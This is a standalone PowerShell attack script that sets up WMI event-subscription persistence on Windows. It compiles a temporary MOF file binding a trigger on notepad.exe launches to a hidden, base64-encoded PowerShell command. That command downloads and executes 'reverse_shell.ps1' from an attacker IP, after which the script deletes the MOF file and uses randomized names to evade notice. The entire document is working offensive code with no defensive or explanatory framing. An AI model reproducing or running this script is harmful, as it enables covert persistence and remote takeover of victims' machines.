$ip = "YOUR IP"
$file = "reverse_shell.ps1"

$randName1 = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 10 | ForEach-Object {[char]$_})
$randName2 = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 10 | ForEach-Object {[char]$_})
$mofFileName = (-join ((97..122) | Get-Random -Count 6 | ForEach-Object {[char]$_})) + ".mof"
$mofPath = "$env:TEMP\$mofFileName"

$command = "iex (new-object net.webclient).downloadstring('http://$ip/$file')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
$payload = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -W hidden -e $encodedCommand"

$mofContent = @"
#pragma namespace("\\\\.\\root\\subscription")
instance of __EventFilter as `$F
{
    Name = "$randName1";
    EventNamespace = "root\\cimv2";
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'";
    QueryLanguage = "WQL";
};

instance of CommandLineEventConsumer as `$C
{
    Name = "$randName2";
    CommandLineTemplate = "$payload";
};

instance of __FilterToConsumerBinding
{
    Filter = `$F;
    Consumer = `$C;
};
"@

$mofContent | Out-File -FilePath $mofPath -Encoding Unicode
& mofcomp.exe $mofPath > $null 2>&1
Remove-Item $mofPath -Force